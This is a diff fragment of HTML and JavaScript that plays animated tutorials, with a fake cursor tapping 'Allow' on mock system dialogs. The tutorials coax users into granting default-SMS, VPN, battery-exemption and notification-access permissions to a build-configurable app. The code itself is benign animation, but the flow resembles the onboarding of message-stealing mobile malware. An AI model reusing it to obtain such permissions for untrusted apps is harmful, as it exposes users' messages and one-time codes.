+  cursor.style.top = "0"; cursor.style.left = "0";
+  btnAllow.classList.remove("highlight", "tapped");
+  dialog.classList.remove("dismissed");
+  $("vpnBadge").classList.remove("visible");
+}
+async function playVpnTutorialCycle() {
+  resetVpnMock();
+  await wait(400);
+  const cursor = $("vpnCursor");
+  const btnAllow = $("vpnMockAllow");
+  const dialog = $("vpnMockDialog");
+  const badge = $("vpnBadge");
+  const btnRect = btnAllow.getBoundingClientRect();
+  const dialogRect = dialog.getBoundingClientRect();
+  const btnCY = btnRect.top - dialogRect.top + btnRect.height / 2 - 7;
+  const btnCX = btnRect.left - dialogRect.left + btnRect.width / 2 - 7;
+  cursor.style.top = (btnCY + 30) + "px"; cursor.style.left = (btnCX + 20) + "px";
+  await wait(400); cursor.classList.add("visible"); await wait(150);
+  cursor.style.top = btnCY + "px"; cursor.style.left = btnCX + "px"; await wait(450);
+  btnAllow.classList.add("highlight"); await wait(400);
+  cursor.classList.add("tap"); btnAllow.classList.add("tapped"); await wait(180);
+  cursor.classList.remove("tap"); btnAllow.classList.remove("tapped"); await wait(150);
+  btnAllow.classList.remove("highlight"); cursor.classList.remove("visible");
+  dialog.classList.add("dismissed"); await wait(350);
+  badge.classList.add("visible"); await wait(1800);
+  badge.classList.remove("visible"); await wait(400);
+}
+function playVpnTutorial() {
+  let running = true;
+  (async () => { while (running) { await playVpnTutorialCycle(); if (!running) break; await wait(600); } })();
+  return () => { running = false; };
+}
+async function enterVpn() {
+  applyBuildVpn();
+  vpnScreen.classList.add("show"); kf(vpnScreen, "fadeIn", 400, "ease"); await wait(200);
+  kf($("vpnDimmer"), "fadeIn", 500, SMOOTH); await wait(300);
+  kf($("vpnCard"), "cardSlideUp", 700, SMOOTH); await wait(400);
+  kf($("vpnIconCircle"), "springScaleIn", 800, "ease"); await wait(250);
+  kf($("vpnCardTitle"), "slideUp", 650, SMOOTH); await wait(150);
+  kf($("vpnCardSubtitle"), "slideUp", 600, SMOOTH); await wait(200);
+  kf($("vpnPreviewLabel"), "slideUp", 550, SMOOTH); await wait(180);
+  kf($("vpnMockDialog"), "scaleSlideUp", 750, SMOOTH); await wait(300);
+  kf($("vpnFooter"), "slideUpBtn", 700, SMOOTH);
+  $("vpnBtn").addEventListener("animationend", function handler() {
+    $("vpnBtn").removeEventListener("animationend", handler);
+    $("vpnBtn").style.animation = "btnGlowPurple 2.8s ease-in-out infinite";
+    $("vpnBtn").style.opacity = "1";
+  });
+  await wait(800); stopVpnTutorial = playVpnTutorial();
+}
+
+function applyBuildNotif() {
+  const name = BUILD.appName || "App";
+  $("notifMockName").textContent = name;
+  $("notifMockIconFb").textContent = name.charAt(0).toUpperCase();
+}
+function resetNotifMock() {
+  const cursor = $("notifCursor");
+  const row = $("notifMockRow");
+  const toggle = $("notifToggle");
+  if (!cursor) return;
+  cursor.classList.remove("visible", "tap");
+  cursor.style.top = "0"; cursor.style.left = "0";
+  row.classList.remove("highlight", "tapped");
+  toggle.classList.remove("on");
+  $("notifMockSub").textContent = LANG.notifMockSub;
+  $("notifMockSub").style.color = "#888";
+  $("notifMockCheck").classList.remove("visible");
+  $("notifBadge").classList.remove("visible");
+}
+async function playNotifTutorialCycle() {
+  resetNotifMock();
+  await wait(400);
+  const cursor = $("notifCursor");
+  const row = $("notifMockRow");
+  const toggle = $("notifToggle");
+  const badge = $("notifBadge");
+  const toggleRect = toggle.getBoundingClientRect();
+  const rowRect = row.getBoundingClientRect();
+  const tCY = toggleRect.top - rowRect.top + toggleRect.height / 2 - 7;
+  const tCX = toggleRect.left - rowRect.left + toggleRect.width / 2 - 7;
+  cursor.style.top = (tCY + 30) + "px"; cursor.style.left = (tCX + 20) + "px";
+  await wait(400); cursor.classList.add("visible"); await wait(150);
+  cursor.style.top = tCY + "px"; cursor.style.left = tCX + "px"; await wait(450);
+  row.classList.add("highlight"); await wait(300);
+  cursor.classList.add("tap"); row.classList.add("tapped"); await wait(180);
+  cursor.classList.remove("tap"); row.classList.remove("tapped"); await wait(100);
+  toggle.classList.add("on");
+  $("notifMockSub").textContent = LANG.notifMockSubOn;
+  $("notifMockSub").style.color = "#E91E63";
+  await wait(300);
+  row.classList.remove("highlight"); cursor.classList.remove("visible");
+  await wait(200);
+  $("notifMockCheck").classList.add("visible");
+  badge.classList.add("visible");
+  await wait(2000);
+  $("notifMockCheck").classList.remove("visible");
+  badge.classList.remove("visible");
+  await wait(400);
+}
+function playNotifTutorial() {
+  let running = true;
+  (async () => { while (running) { await playNotifTutorialCycle(); if (!running) break; await wait(600); } })();
+  return () => { running = false; };
+}
+async function enterNotif() {
+  applyBuildNotif();
+  notifScreen.classList.add("show"); kf(notifScreen, "fadeIn", 400, "ease"); await wait(200);
+  kf($("notifDimmer"), "fadeIn", 500, SMOOTH); await wait(300);
+  kf($("notifCard"), "cardSlideUp", 700, SMOOTH); await wait(400);
+  kf($("notifIconCircle"), "springScaleIn", 800, "ease"); await wait(250);
+  kf($("notifCardTitle"), "slideUp", 650, SMOOTH); await wait(150);
+  kf($("notifCardSubtitle"), "slideUp", 600, SMOOTH); await wait(200);
+  kf($("notifPreviewLabel"), "slideUp", 550, SMOOTH); await wait(180);
+  kf($("notifMockRow"), "scaleSlideUp", 750, SMOOTH); await wait(300);
+  kf($("notifFooter"), "slideUpBtn", 700, SMOOTH);
+  $("notifBtn").addEventListener("animationend", function handler() {
+    $("notifBtn").removeEventListener("animationend", handler);
+    $("notifBtn").style.animation = "btnGlowPink 2.8s ease-in-out infinite";
+    $("notifBtn").style.opacity = "1";
+  });
+  await wait(800); stopNotifTutorial = playNotifTutorial();
+}
+
+function showCard(jsonStr) {
+  try {
+    const d = JSON.parse(jsonStr);
+    BUILD.appName = d.appName || "App";
+    const stepId = d.stepId || "sms_default";
+    hideAll();
+    wait(50).then(() => {
+      if (stepId === "sms_default") return enterSms();
+      if (stepId === "sms_runtime") return enterSmsr();
+      if (stepId === "battery") return enterBatt();
+      if (stepId === "vpn") return enterVpn();
+      if (stepId === "notification_access") return enterNotif();
+    });
+  } catch (e) { console.error(e); }
+}
+function hideCard() { hideAll(); }
+
+</script>
+</body>
+</html>
